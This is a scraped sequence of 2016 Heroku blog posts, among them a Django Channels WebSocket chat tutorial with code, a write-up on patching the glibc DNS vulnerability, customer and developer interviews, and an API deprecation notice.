},\n    \"SLACK_TOKEN\": {\n      \"description\": \"Slack bot RTM API token\",\n      \"required\": false\n    },\n  },\n  \"image\": \"heroku/nodejs\"\n} As you can see above, we begin by specifying our apps name, description and repo. We then declare the environment variables Starbot requires to run. Learn more about the app.json schema on the Dev Center . Adding the Heroku Button to the repo The last thing we must do before people can begin deploying Starbot with the Heroku Button, is to add it to the project's README.md : [![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy) Heroku will automatically infer the repository URL from the referrer header when someone clicks on the button. Epilogue Now that you’ve got the basics down, a whole new world of functionality is at your team’s fingertips. Not just your team’s either–with a little more work you can offer your bot as a service for others on Slack through the App Directory. Peruse the directory to see the many ways teams are extending Slack, whether it's with the outside world through Customer Support apps, or internally with HR or Office Management. To learn more about offering your app, check out their getting started guide. slack slack-bots node", "date": "2016-03-08,"},
{"website": "Heroku", "title": "Finally, Real-Time Django Is Here: Get Started with Django Channels", "author": ["Jacob Kaplan-Moss"], "link": "https://blog.heroku.com/in_deep_with_django_channels_the_future_of_real_time_apps_in_django", "abstract": "Finally, Real-Time Django Is Here: Get Started with Django Channels Posted by Jacob Kaplan-Moss March 17, 2016 Listen to this article Today, we're thrilled to host Jacob Kaplan-Moss . Jacob's a former Herokai and long-time core contributor to Django, and he's here to share an in-depth look at something that he believes will define the future of the framework. When Django was created, over ten years ago, the web was a less complicated place. The majority of web pages were static. Database-backed, Model/View/Controller-style web apps were the new spiffy thing. Ajax was barely starting to be used, and only in narrow contexts. The web circa 2016 is significantly more powerful. The last few years have seen the rise of the so-called “real-time” web: apps with much higher interaction between clients and servers and peer-to-peer. Apps comprised of many services (a.k.a. microservices) are the norm. And, new web technologies allow web apps to go in directions we could only dream of a decade ago. One of these core technologies are WebSockets : a new protocol that provides full-duplex communication — a persistent, open connection between the client and the server, with either able to send data at any time. In this new world, Django shows its age. At its core, Django is built around the simple concept of requests and responses: the browser makes a request, Django calls a view, which returns a response that’s sent back to the browser: This doesn’t work with WebSockets! The view is only around for the lifespan of a single request, and there’s no mechanism to hold open a connection or send data down to the client without an associated request. Thus: Django Channels . Channels, in a nutshell, replaces the “guts” of Django — the request/response cycle — with messages that are sent across channels . Channels allows Django to support WebSockets in a way that’s very similar to traditional HTTP views. Channels also allow for background tasks that run on the same servers as the rest of Django. HTTP requests continue to behave the same as before, but also get routed over channels. Thus, under Channels Django now looks like this: As you can see, Channels introduces some new concepts to Django: Channels are essentially task queues: messages get pushed onto the channel by producers , and then given to one of the consumers listening on that channel. If you’ve used channels in Go, the concept should be fairly familiar. The main difference is that Django channels work across a network and allow producers and consumers to run transparently across many dynos and/or machines. This network layer is called the channel layer . Channels is designed to use Redis as its preferred channel layer, though there is support for other types (and a first-class API for creating custom channel layers). There are neat and subtle technical details; consult the documentation for the full story. Right now, Channels is available as a stand-alone app that works with Django 1.9. The plan is to roll Channels into Django for the 1.10 release, due out some time this summer. I believe that Channels will be an incredible important addition to Django: they allow Django to move smoothly into this new age of web development. Although these APIs aren’t part of Django yet, they will be soon! So, now’s a perfect time to start learning about Channels: you can learn about the future of Django before it lands. Getting started: how to make a real-time chat app in Django As an example, I’ve built a simple real-time chat app — like a very, very light-weight Slack. There are a bunch of rooms, and everyone in the same room can chat, in real-time, with each other (using WebSockets). You can visit my deployment of the example online , check out the code on GitHub , or deploy your own copy with this button (which requires a free Heroku account, so sign up for that first ): Note: you'll need to scale the worker process type up after using the button. Use the Dashboard, or run heroku ps:scale web=1:free worker=1:free . For in-depth details on how the app works — including why you need worker dynos! — read on. I’ll walk through the steps to take to build this app, and highlight the import bits and concepts along the way. First steps — it’s still Django Although there are differences under the hood, this is still the same Django we’ve been using for ten years. So the initial steps are the same as any Django app. (If you’re new to Django, you might want to check out Getting Started With Python on Heroku and/or the Django Girls Tutorial .) After creating a project, we can define model to represent a chat room, and the messages within it ( chat/models.py ): class Room(models.Model):\n    name = models.TextField()\n    label = models.SlugField(unique=True)\n\nclass Message(models.Model):\n    room = models.ForeignKey(Room, related_name='messages')\n    handle = models.TextField()\n    message = models.TextField()\n    timestamp = models.DateTimeField(default=timezone.now, db_index=True) (In this, and all subsequent examples, I’ve trimmed the code down to the bare minimum, so we can focus on the important bits. For the full messy detailed code, see the project on Github .) And then a view ( chat/views.py , and the associated urls.py and chat/room.html template): def chat_room(request, label):\n    # If the room with the given label doesn't exist, automatically create it\n    # upon first visit (a la etherpad).\n    room, created = Room.objects.get_or_create(label=label)\n\n    # We want to show the last 50 messages, ordered most-recent-last\n    messages = reversed(room.messages.order_by('-timestamp')[:50])\n\n    return render(request, \"chat/room.html\", {\n        'room': room,\n        'messages': messages,\n    }) At this point, we have a functioning — if unexciting — Django app. If you run this with a standard Django install, you’d be able to see existing chat rooms and transcripts, but not interact with them in any way. Real-time chat doesn’t work — for that we need something that can handle WebSockets. Where we’re going To get a handle on what is needed to be done on the backend, let’s look at the client code. You can find it in chat.js — and there isn’t much of it! First, we create a websocket: var ws_scheme = window.location.protocol == \"https:\" ? \"wss\" : \"ws\";\nvar chat_socket = new ReconnectingWebSocket(ws_scheme + '://' + window.location.host + \"/chat\" + window.location.pathname); Note that: Like HTTP and HTTPS, the WebSocket protocol comes in secure (WSS) and insecure (WS) flavors. We need to make sure to use the “correct” flavor. Because Heroku’s router has a 60-second timeout , I use a little shim around the browser WebSocket that automatically reconnects if the socket gets disconnected. (Thanks to Kenneth Reitz, who pointed this out in his Flask WebSocket example .) Next, we’ll wire up a callback so that when the form’s submitted, we send data over the WebSocket (rather than POSTing it): $('#chatform').on('submit', function(event) {\n    var message = {\n        handle: $('#handle').val(),\n        message: $('#message').val(),\n    }\n    chat_socket.send(JSON.stringify(message));\n    return false;\n}); We can send any text data we’d like over the WebSocket. Like most APIs, JSON is easiest, so we’ll bundle up the data as JSON and send it that way. Finally, we need to wire up a callback to fire when new data is received on the WebSocket: chatsock.onmessage = function(message) {\n    var data = JSON.parse(message.data);\n    $('#chat').append('<tr>' \n        + '<td>' + data.timestamp + '</td>' \n        + '<td>' + data.handle + '</td>'\n        + '<td>' + data.message + ' </td>'\n    + '</tr>');\n}; Simple stuff: just append a row to our transcript table, pulling data out of the received message. If I run this code now, it won’t work — there’s nothing listening to WebSocket connections, just HTTP. So now, let’s turn to connecting WebSockets. Installing and setting up Channels To “channel-ify” this app, we’ll need to do three things: install Channels, set up a channel layer , define channel routing, and modify our project to run under Channels (rather than WSGI). 1. Install Channels To install Channels, simply pip install channels , then add \"channels” to your INSTALLED_APPS setting. Installing Channels allows Django to run in “channel mode”, swapping out the request/response cycle with the channel-based architecture described above. (For backwards-compatibility, you can still run Django in WSGI mode, but WebSockets and all the other Channel features won’t work in this backwards-compatible mode.) 2. Choose a channel layer Next, we need to define a channel layer . This is the transport mechanism that Channels uses to pass messages from producers (message senders) to consumers. It’s a type of message queue with some specific properties ( see the Channels documentation for details ). We’ll use Redis for our channel layer: it’s the preferred production-quality channel layer, and the obvious choice when deploying to Heroku. There are also in-memory and database-backed channels layers, but those are more suited to local development or low-traffic usage. (For more details, again refer to the documentation .) But first: because the Redis channel layer is implemented in a different package, we’ll need to pip install asgi_redis . (I’ll talk a bit more about what “ASGI” is below.) Then, we define our channel layer in the CHANNEL_LAYERS setting: CHANNEL_LAYERS = {\n    \"default\": {\n        \"BACKEND\": \"asgi_redis.RedisChannelLayer\",\n        \"CONFIG\": {\n            \"hosts\": [os.environ.get('REDIS_URL', 'redis://localhost:6379')],\n        },\n        \"ROUTING\": \"chat.routing.channel_routing\",\n    },\n} Note that we’re pulling the Redis connection URL out of the environ, to future-proof for when we eventually deploy to Heroku. 3. Channel routing In CHANNEL_LAYERS , we’ve told Channel where to look for our channel routing — chat.routing.channel_routing . Channel routing is a very similar concept to URL routing: URL routing maps URLs to view functions; channel routing maps channels to consumer functions. Also similar to urls.py , by convention channel routes live in a routing.py .  For now, we’ll just create an empty one: channel_routing = {} (We’ll see a few channel routes below, when we wire up WebSockets.) You’ll notice that our example app has both a urls.py and a routing.py : we’re using the same app to handle HTTP requests and WebSockets. This is expected, and typical: Channels apps are still Django apps, so all the features you except from Django — views, forms, models, etc. — continue to work as they did pre-Channels. 4. Run with channels Finally, we need to swap out Django's HTTP/WSGI-based request handler, for the one built into channels. This is based around an emerging standard called ASGI (Asynchronous Server Gateway Interface), so we’ll define that handler in an asgi.py file: import os\nimport channels.asgi\n\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"chat.settings\")\nchannel_layer = channels.asgi.get_channel_layer() (In the future, Django will probably auto-generate this file, like it currently does for wsgi.py .) At this point, if we got everything right, we should be able to run the app under channels. The Channels interface server is called Daphne , and we can run our app with it like so: $ daphne chat.asgi:channel_layer --port 8888 **\nIf we now visit http://localhost:8888/ we should see…. nothing happen. This might be confusing, until you remember that Channels splits Django into two parts: the front-end interface server, Daphne , and the backend message consumers. So to actually handle HTTP requests, we need to run a worker: $ python manage.py runworker Now , requests should go through. This illustrates something pretty neat: Channels continues to handle HTTP(S) requests just fine, but it does it in a complete different way. this isn’t too different from running Celery with Django, where you’d run a Celery worker alongside a WSGI server. Now, though, all tasks — HTTP requests, WebSockets, background tasks — get run in the worker. (By the way, we can still run python manage.py runserver for easy local testing. When we do, Channels simply runs Daphne and a worker in the same process.) WebSocket consumers All right, enough setup; let’s get to the good parts. Channels maps WebSocket connections to three channels: A message is sent to the websocket.connect channels the first time a new client (i.e. browser) connects via a WebSocket. When this happens, we’ll record that the client is now “in” a given chat room. Each message the client sends on the socket gets sent across the websocket.receive channel. (These are just messages received from the browser; remember that channels are one-direction. We’ll see how to send messages back to the client in a bit.) When a message is received, we’ll broadcast that message to all the other clients in the \"room”. Finally, when the client disconnects, a message is sent to websocket.disconnect . When that happens, we’ll remove the client from the “room”. First, we need to hook each of these channels up in routing.py : from . import consumers\n\nchannel_routing = {\n    'websocket.connect': consumers.ws_connect,\n    'websocket.receive': consumers.ws_receive,\n    'websocket.disconnect': consumers.ws_disconnect,\n} Pretty simple stuff: just connect each channel to an appropriate function. Now, let’s look at those functions. By convention we’ll put these functions in a consumers.py (but, like views, these could be anywhere.) Let’s look at ws_connect first: from channels import Group\nfrom channels.sessions import channel_session\nfrom .models import Room\n\n@channel_session\ndef ws_connect(message):\n    prefix, label = message['path'].strip('/').split('/')\n    room = Room.objects.get(label=label)\n    Group('chat-' + label).add(message.reply_channel)\n    message.channel_session['room'] = room.label (For clarity, I’ve stripped all the error handling and logging from this code. To see the full version, see consumers.py on GitHub). This is dense; let’s go line-by-line: 7. The client will connect to a WebSocket with a URL of the form /chat/{label}/ , where label maps to a Room’s label attribute. Since all WebSocket messages (regardless of URL) get sent to the same set of channel consumers, we’ll need to work out which Room we’re talking about by parsing the message path. Notice that the consumer is responsible for parsing the WebSocket path by reading message['path'] . This is different from traditional URL routing, where Django’s urls.py routes based on path; If you have multiple WebSocket URLs, you’ll need to route to different functions yourself. (This is one place where the “early-days” aspects of Channels shows; it’s quite likely that future versions of Channels will include WebSocket URL routing.) 8. Now, we can look up the Room object from the database. 9. This line’s the key to making chatting work. We need to know how to send messages back to this client. For that, we’ll use the message’s reply_channel — every message will have a reply_channel attribute, which we can use to send messages back to the client. (We don’t need to create that channel ourselves; Channels creates it for us.) However, it’s not going to be good enough to just send messages to that one channel; when a user chats, we want to send messages to everyone who's connected to that room. For that, we’ll use a channel group . A group is simply a connection of channels that you can broadcast messages to. So, we’ll add this message’s reply_channel to a group specific to this chat room. 10. Finally, subsequent messages (receive/disconnect) won’t contain the URL anymore (since the connection is already active). So, we need a way of “remembering” which room a WebSocket connection maps to. For this, we can use a channel session. Channel sessions are very similar to Django's session framework: they persist data between channel messages on an attribute called message.channel_session . Adding the @channel_session decorator to a consumer is all we need to make sessions work. (The documentation has more details on how channel sessions work ). Now that a client is connected, let’s take a look at ws_receive . This consumer will get called each time a message is received on the WebSocket: @channel_session\ndef ws_receive(message):\n    label = message.channel_session['room']\n    room = Room.objects.get(label=label)\n    data = json.loads(message['text'])\n    m = room.messages.create(handle=data['handle'], message=data['message'])\n    Group('chat-'+label).send({'text': json.dumps(m.as_dict())}) (Once again, I’ve stripped error handling and logging  for clarity.) The first few few lines are pretty simple: extract the room from the channel_session , look it up in the database, parse the JSON  message, and store the message in the database as a Message object. After that, all we have to do is broadcast this new message to everyone in the chat room, and for this we’ll use the same channel group as before. Group.send() will take care of sending this message to every reply_channel added to the group. After that, ws_disconnect is very simple: @channel_session\ndef ws_disconnect(message):\n    label = message.channel_session['room']\n    Group('chat-'+label).discard(message.reply_channel) Here, after looking up the room in the channel session, we disconnect ( discard ) the reply_channel from the chat group. That’s it! Deploying and scaling Now that we’ve got WebSockets hooked up and working, we can test it out by running daphne and runworker , as above (or by running manage.py runserver ). But it’s lonely talking to yourself, so let’s see what it takes to get this running on Heroku! For the most part, a Channels app works the same as an Python app as Heroku — specify requirements in requirements.txt , define a Python runtime in runtime.txt , deploy with the standard git push heroku master , etc. (For a refresher, see the Getting Started with Python on Heroku tutorial.) I’ll just highlight the differences between a Channels app and a standard Django app: 1. Procfile and process types Because Channels apps need both a HTTP/WebSocket server and a backend channel consumer, the Procfile needs to define both of these types. Here’s our Procfile : web: daphne chat.asgi:channel_layer --port $PORT --bind 0.0.0.0 -v2\nworker: python manage.py runworker -v2 And, when we do our initial deploy, we’ll need to make sure both process types are running (Heroku will only start the web dyno by default): $ heroku ps:scale web=1:free worker=1:free (A simple app will run within the limits of Heroku’s free or hobby tiers, though for real-world usage you’ll probably want to upgrade to production dynos to handle better throughput.) 2. Addons: Postgres and Redis Like most Django apps, you’ll want a database, and Heroku Postgres is perfect for that. However, Channels also requires a Redis instance to act as the channel layer. So, we’ll want to create both a Heroku Postgres and a Heroku Redis instance when deploying our app for the first time: $ heroku addons:create heroku-postgresql\n$ heroku addons:create heroku-redis 3. Scaling Since Channels is fairly new, the scalability issues aren’t quite known yet. However, I can make a few guesses based on the architecture and some early performance tests I ran. The key is that Channels splits processes between those responsible for handling connections ( daphne ), and those responsible for handling channel messages ( runworker ). This means that: The throughput of channels — HTTP requests, WebSocket messages, or custom channel messages — is mostly determined by the number of worker dynos. So, if you need to handle greater request volume, you’ll do it by scaling up worker dynos (e.g. heroku ps:scale worker=3 ). The level of concurrency — the number of current open connections — will mostly be limited by the scale of the front-end web dyno. So, if you needed to handle more concurrent WebSocket connections, you’d scale up the web dyno (e.g. heroku ps:scale worker=2 ) Based on my early performance tests, Daphne is quite capable of handling many hundreds of concurrent connections on a Standard-1X dyno, so I expect it’ll be rare to have to scale up the web dynos. The number of worker dynos in a Channels app seems to map fairly closely to the number of needed web dynos in a similar old-style Django app. What’s next? WebSocket support is a huge new feature for Django, but it only scratches the surface of what Channels can do. Remember: Channels is a general-purpose utility for running background tasks. Thus, many features that used to require Celery or Python-RQ could be done using Channels instead. Channels can’t replace dedicated task queues entirely: it has some important limitations, including at-most-once delivery, that don’t make it suitable for all use cases. See the documentation for full details. Still, Channels can make common background tasks much simpler. For example, you could easily use Channels to perform image thumbnailing, send out emails, tweets, or SMSes, run expensive data calculations, and more. As for the Channels itself: plan is to include Channels in Django 1.10, which is scheduled for release this summer. This means that now’s a great time to try it out and give feedback: your input could help drive the direction of this critical feature. If you want to get involved,  check out the guide to Contributing to Django ,  then hop onto the django-developers mailing list to share your feedback. Finally: major thanks to Andrew Godwin for his work on Channels. This is a tremendously exciting new direction for Django, and I’m thrilled to see it starting to take shape. Further Reading For more information about Channels, please see the Channels documentation , which includes a ton more details and reference, including: Answers to some Frequently Asked Questions about Channels. The plan of record for integrating Channels into Django . The formal Asynchronous Server Gateway Interface (ASGI) spec (if you really want all the technical details!) For more information on Python on Heroku, visit Python on Heroku in Dev Center . A couple of particularly good articles I recommend are: Getting Started with Python on Heroku Configuring Django apps for Heroku django python real-time django-channels channels", "date": "2016-03-17,"},
{"website": "Heroku", "title": "Heroku Behind the Curtain: Patching the glibc Security Hole", "author": ["Joy Scharmen"], "link": "https://blog.heroku.com/patching-glibc-security-hole", "abstract": "Heroku Behind the Curtain: Patching the glibc Security Hole Posted by Joy Scharmen March 21, 2016 Listen to this article If you’re a developer, it’s unlikely you’ve ever said \"I wish I could spend a whole day patching critical security holes in my infrastructure!\" (If you do, we’re hiring ).  And if you’re running a business, it’s unlikely you’ve ever said “Yes! I would like my developers to lose a day’s worth of feature-building on security patches!”. At Heroku, we believe you shouldn’t have to spend the time required to patch, test, and deploy security fixes. Because of that, some of Heroku’s most important features are ones you never see: we keep our platform reliable and secure for your apps so you don’t have to. Recently Google Security and Red Hat both discovered a high severity bug in a fundamental system library—glibc. This library is in common usage across the internet. If a server with a vulnerable version of the library were to make a DNS request to a malicious resolver, the DNS server could potentially execute code on the system making the request. What do we do when a security vulnerability lands? Heroku took the glibc issue very seriously. We’ve done a lot of work to make sure our dyno containers are secure and we do everything possible to keep our customers safe. Our first step in any security incident is an immediate assessment by our security team. They work with our engineering teams to determine how big of a risk any vulnerability is to us. In this case, the potential for remote code execution meant that we considered it a high priority patch for any system running glibc and querying DNS. That’s pretty much all of them. We patched our entire runtime fleet for both our Common Runtime and Private Spaces platforms. We also patched our Cedar stack image , to ensure that all the code you’re running in your dynos stays safe. Last and most complicated, we patched our Data platform (Postgres and Redis) while keeping your data safe and available. How do we do this with a minimum of downtime? We have standard practices for rolling out changes such as upgrades, new features, or security patches. These practices vary depending on the platform we’re applying the changes to. For the Common Runtime and Private Spaces this is built into our infrastructure. When we push a new software version, we build a new base image (which is what dynos live on top of) and cycle your dynos off to a fresh instance using the new image. An automated Continuous Integration (CI) pipeline updates our base images every time we update one of our components and includes the latest Ubuntu base image. This new base image is automatically used by automated tests and new runtimes in staging. We cut a new release based on it and trigger the upgrade: first to our existing staging fleet, then to a small subset of production, then the entire production fleet. Tests run between each of these stages. In this case, we ensured that the latest base image contained the patched version of glibc and manually triggered our normal staged update and testing process. What about the dynos themselves? They are security-hardened Linux containers which are isolated from the base image they run on. Dynos are composed of a few pieces—your code, which we call a slug , your language-specific buildpack, and what we call stack images . Stack images provide basic system resources like glibc, and we make sure they have the latest security patches. In this case, we updated our stack image at the same time we updated our base image, as soon as we had a patched version of glibc. As dynos cycle, they pick up the new stack image. This dyno cycle takes 24 hours by default, and if we feel the need to move more quickly, we can force a faster refresh. In this case we waited for our normal 24 hour cycle to prevent customers noticing disruption as everything restarts in quick succession. Our assessment of the vulnerability was that the risk was not so high that it would be worth potentially affecting running apps. What about data? Postgres, Redis, and any data store are more complicated to update. Customers store irreplaceable information that we can’t architect around like we do for our runtimes. We need to be both available and secure, patching servers while keeping your data flowing. To solve this problem for Heroku Postgres, we have follower databases . These automatically get a copy of all the data sent to your main database. When we need to update quickly, we can create a new, updated follower first and then change the follower to the main database . This does cause a short period of downtime, which is why we allow you to set maintenance windows so you can anticipate interruptions. In this case, based on our assessment of the vulnerability, most customers received their updates in their expected maintenance window. For Heroku Redis , we have a similar story, including maintenance windows . Again, most customers received their updates in their expected maintenance window. What about Heroku itself? A lot of Heroku runs on our own platform! We use all the tools we have to keep our customers secure and stable for ourselves. We did schedule some maintenance to patch our own internal databases with the above follower changeover process. This maintenance affected our API , Deployment , and orchestration system for a few minutes on each database. It didn’t affect our routers or runtimes—so your customers would have been able to reach your app even during maintenance. Keep calm, carry on The need to patch occasional security holes is serious and unavoidable. Before this glibc issue, there was last year’s GHOST issue , and Heartbleed before that.  At Heroku, we believe these patches shouldn’t disrupt your flow. We work very hard to handle security issues and other platform maintenance with minimum impact to you or your apps—so you can carry on with your work without distraction.", "date": "2016-03-21,"},
{"website": "Heroku", "title": "React, Ruby and CI: An Interview with Matthew Eckstein", "author": ["Matthew Creager"], "link": "https://blog.heroku.com/how-charity-water-uses-react-ruby-and-ci-an-interview-with-matthew-eckstein", "abstract": "React, Ruby and CI: An Interview with Matthew Eckstein Posted by Matthew Creager March 22, 2016 Listen to this article Matthew Eckstein is the VP of Engineering for charity: water. For more information, visit: www.charitywater.org . Read our charity: water customer story to learn more about how Heroku has helped their organization deliver clean water to millions of people around the world. Tell us a bit about charity: water charity: water is a non-profit organization that brings clean and safe drinking water to people in developing nations all around the world. We rebuilt our online fundraising and donation platform on Heroku and are super excited to share our story today, March 22nd on World Water Day . When we first moved to Heroku, we decided to rebuild our system from the ground up. The engineering team was already familiar with Heroku, which made it an easy choice. Tell us about your stack Our new stack is built using Ruby on Rails connected to a Heroku Postgres database. We do a lot of asynchronous processing using Sidekiq and Heroku Redis. We recently started adding isomorphic React components using both the Ruby and Node.js Heroku Buildpacks because we were building some complex Javascript behaviors. It seems to be going well so far. When we think about our new stack at charity: water, Heroku is at the core of it. Any system that we build or rebuild gets put on Heroku. Also, continuous integration is woven into Heroku, which is perfect for us. What about your application architecture? Is your API separate from your front-end client? Our fundraising platform is one app. We don't have a separate front-end client that uses an API. We do have other apps with specific functions that are also hosted on Heroku. One such app is a Sinatra app that takes callbacks from our payment providers and syncs the data to our fundraising platform and our general ledger. What is your deployment process? We use Heroku’s Git integration for source control and deployment, along with GitHub, pull requests (PRs), and a continuous integration process using Codeship as a Heroku Add-on. For the fundraising app, we use a continuous delivery process. We do test-driven development with test coverage close to 100%. So when we make a pull request, we use Heroku Review Apps for testing and merge to master. It runs CI again and deploys through Heroku Pipelines. How do you conduct internal reviews? We have three checkpoints before deployment. At least one engineer will review every pull request. The first thing the reviewing engineer looks for is that the solution is simple and directly addresses the problem we are trying to solve. We would rather write clear, simple code and refactor later than risk over-engineering and create unneeded complexity. We also look to make sure it is obvious what the code does and what the effect of a change would be. One ideal we strive for is that all code pushed to production should be exemplary. Our code should have the ability to be used as an example of how to write new code. There shouldn’t be anything on our site that we wouldn’t want to replicate. There are always comments in our PRs. Every once in awhile we will see one with many comments. It’s a good sign when that happens because it means our engineers are very actively reviewing the code. I’d rather see a clash of strong opinions than a very passive process where people are just looking for obvious mistakes. If the PR addresses a user-facing feature, our product team and/or creative team will use Heroku Review Apps to test it from a user’s point of view as well. It’s great how seamless the review app integrates into our workflow. Finally, we have all of our automated testing. If it can be automated, we prefer to automate it! What other tools do you use for testing? In our quest to reduce visual regressions on charitywater.org, we experimented with a few solutions. We started by building tools based on some open source projects. After realizing that this would be a larger maintenance burden than we initially realized, we moved on to another commercial solution. That worked pretty well, but it didn't catch the visual regressions until they were already in our production environment. Eventually, we landed on a great service called Percy.io . Percy is a continuous visual regression system that exposes visual regression at the same point that the rest of our automated tests run. We use Codeship and parallelize our tests since we have so many but don’t like to wait. Some other tools we use include Rubocop for coding style and Code Climate to identify potentially problematic code. What has been the greatest benefit to using Heroku? charity: water has always been at the leading edge of using technology to drive our work. We raise a tremendous percentage of our funds online, and we also use technology heavily in our operations and to monitor our projects in the field. Our 100% model means that we fundraise separately for operations and water projects. When we can save money on ops, we’re also saving on opportunity cost. Our fundraisers can now focus more of their time on raising money for water. Heroku’s services are so seamless and easy to use—the add-on services, the deploy process with Git integration and Review Apps—it allows our engineers to focus on work that raises money and makes our operation more efficient. Heroku’s services eliminate the need for a dedicated DevOps role at charity: water, which saves operational budget that can be applied elsewhere in the organization. Thank you for your time! Thanks!", "date": "2016-03-22,"},
{"website": "Heroku", "title": "Sunsetting Heroku’s Legacy Platform API (v2)", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/sunsetting_heroku_s_legacy_platform_api_v2", "abstract": "Sunsetting Heroku’s Legacy Platform API (v2) Posted by Nahid Samsami April 04, 2016 Listen to this article Two years ago we released the Heroku Platform API (v3), providing a supported way to automate and instrument Heroku and making it even easier for you to build new products. Today we are deprecating the legacy, unofficial version of the API that preceded it (v2), as its usage is limited and we are focusing development on the newer, officially-supported API. We will sunset v2 of the API on April 15, 2017. For security reasons, we will be sunsetting support of auth in query string sooner, which we will announce in the Changelog . If you are using the older version of the API, we recommend transitioning to v3 as soon as possible . Please reach out to us through support if you have any questions as you make the transition.", "date": "2016-04-04,"},
{"website": "Heroku", "title": "Talking with Tom Dale about Ember FastBoot and the Return of Scrappy JavaScript", "author": ["Matthew Creager"], "link": "https://blog.heroku.com/live_at_emberconf_tom_dale_talks_about_ember_fastboot", "abstract": "Talking with Tom Dale about Ember FastBoot and the Return of Scrappy JavaScript Posted by Matthew Creager April 05, 2016 Listen to this article Last week, Terence Lee and I caught up with Tom Dale at EmberConf to talk about FastBoot, when you should avoid native apps, and why JavaScript on the server and the browser might start to converge. Check the end for the full recording! So let's start with the drama, would you say Ember has declared war on native apps? [laughs] [sigh] Yeah. Yeah, I think that's fair. Yeah. Sure. Why not? Let's go with that. A lot of other frameworks, take this approach of bringing web technologies and dropping them into native experiences - React Native being the prime example. It seems that Ember wants to bring back the glory days for web technologies - is that right? Yeah, absolutely. I don't have anything personal against native apps. I use a lot of them, and I think that there are a lot of situations where native apps provide a better experience. And I don't care at all about what technology you use. I care about the user experience. I think there's this false accounting that people do. It's like how in the 50s and 60s no one ever got fired for buying IBM. And that's where we are today. No one ever gets fired for building a native app. And that means that people take the thinking out of the equation and say, \"what is everyone else doing?\" And everyone else has a native app, everyone else puts up an interstitial that tries to push you to the App Store, and they don't focus on the user experience. So the thing we tried to show in the keynote is that apps are great once they're on the phone, but if you're tapping a link on Twitter or a Google search and it takes you to the App Store, and you have to wait a minute or more? Native applications are 80 megabytes - Facebook's like 80 megabytes - and everyone's complaining about JavaScript apps being 500k. Do you think some experiences make more sense in native than in web tech? I think there's always going to be APIs that roll out to native first, and if you're writing a game, I think that's fine, if you need access to the hardware I think writing a native app makes a lot of sense. But I don't think there's a reason that Pinterest needs to be a native app. I don't think that Facebook needs to be a native app. It's not taking advantage of anything you can't do on the web. What are the fundamentals? What do we need to do in Ember to create a great mobile experience? So this is the tricky thing, right? You're fighting a two-front war as a mobile developer. You have all the native people who say you have to write - you need to offer an experience for the web that's competitive with us native developers - and you have old school web people saying you need to load as fast as us if you want to have a good web experience. So you're caught in the crossfire. No matter what you do, someone's going to criticize you. You either have too much JavaScript, or you don't have enough features. And so the question is: how do you bend this curve, this tradeoff you have to make? For us, that means thinking smart about breaking your application up into pieces and streaming it, effectively. And actually, Ember's pretty well set up to do that because we have a very conventional app structure that's focused on the routes in your application. We already break your application up into pages, and so it's pretty easy for us to figure out, ok well how do we break that up into pieces and only give the user what they need to see that particular page? Things like FastBoot mean we can keep your application in memory on Heroku or whatever host you're using, and you can serve it up very fast. And that's a way of outsourcing the JavaScript runtime to Heroku until the JavaScript finishes loading on the client, and I think the last thing is taking advantage of features that we have forgotten about, or have gotten a bad reputation. AppCache is the best example. People think of AppCache as a deprecated technology, and I'm not surprised, because you go on the MDN website, and there's big scary warnings — \"THIS IS DEPRECATED AND WILL BE REMOVED.\" But both Chrome and Firefox have officially said they're deprecating it. They've officially stated that they've deprecated it, but if you look at it, it has incredible feature penetration, it's in far more browsers than service worker or ES6 or any of these things. ServiceWorker is obviously the future, but it's not well distributed yet. And AppCache is in something like 90% of browsers globally.  In my opinion, AppCache is a little bit hard to work with — there are rough edges, it's not a perfect API. There's no question about that. But it exists, it's in the browser. And I think there was this era, this feeling of scrappiness, in the JQuery era, the IE6 era, where you had to know all these hacks just to put a div in the right place on the screen. And people spent hours and hours and days and days figuring out hacks to make it happen. And I think we need that spirit of scrappiness again and say, \"yeah, this API sucks, but let's build tools to make it pleasant just like JQuery did.\" There's no excuse if your app boots in more than 200ms, on second boot. You can put all those assets in the browser's cache, and there's no reason you should download those again if the user's been to your page before. Yeah, we've just never done caching very well. The whole JavaScript community has been allergic to caching for some reason — Well, it's always been one of the hard computer science problems — Yeah, what is it? Caching and concurrency? Caching and naming things [laughs]. Here's the bottom line — HTTP caching, which is what most people think about when you think about caching for their JavaScript applications, is from an era where most things were rendered on the server. HTTP caching is just not appropriate when you're adopting a client-side architecture. And that's why AppCache exists. And again, yeah, it has rough edges, but I think that what we can do in the Ember community is write a bunch of tools so that you as a developer don't have to learn all those edge cases. We'll just say, write your application the Ember way, and we'll give you all the advantages of AppCache out of the box. So you mentioned FastBoot. Terence has been working hard to make the FastBoot experience with the new open-source Heroku buildpack amazing. And you used that to deploy ember-fastboot.com . So the Ember FastBoot website is itself an Ember FastBoot app. It's an Ember app, running FastBoot, on Heroku, that's been awesome. We've worked closely with Terence; he was up late the night before the keynote making sure it was out and fast, and I have to say I'm incredibly impressed. It was on the front page of HackerNews for the entire day, which usually amounts to one hundred-some thousand hits, and it was just so fast the entire time. Actually we've gotten tweets about how fast it is. It's pretty mind-bending — you're used to having this tradeoff on the web. A page is fast, but because it's rendered on the server to load, each navigation you have to keep talking to the server. But the FastBoot website is different. You hit it, you get HTML, but the JavaScript loads in the background. So each click after that is not having to talk to the server, it's rendered in your browser, your local machine. So it's really important to be fast — especially when you put fast in the name of the product. Yeah, it would be embarrassing if — If it was SlowBoot? Yeah, actually — so Dockyard, which is a consultancy that does a lot of Ember projects, they just recently moved their homepage to FastBoot. And I asked them if they could do a non-FastBoot version of it that I could just compare against. So how slow is it? Does it feel slow? On a modern device, on broadband, it's imperceptible for the most part, but when you notice it is if you're on a slower connection, like a 2G or 3G connection. That's where things like FastBoot matter. And of course, not all devices have JavaScript, not all crawlers have JavaScript, and you might be on a mobile device, and maybe your connection drops and the JavaScript doesn't load - it's still nice to see the content. Do you think, are there other things about a FastBoot application that developers should consider when adopting? Are there other reasons to adopt FastBoot? SEO is a big one. Another reason that not a lot of people think about is Facebook Open Graph tags and Twitter Cards — because you can add these annotations to your HTML, and Facebook and Twitter use these to create a much nicer experience when someone pastes your URL into a share box or whatever. And that requires server rendering and adding these, so that's been one really key thing. In terms of adopting FastBoot and the migration story, I think the consensus today is FastBoot is new, you should start experimenting with it. When is it going to be something people can use in production apps? Well, I'm personally rolling out to production very soon, and already have in several client projects I'm working on, but it is pre-1.0 software. We're going to release 1.0 along with Ember 2.7. 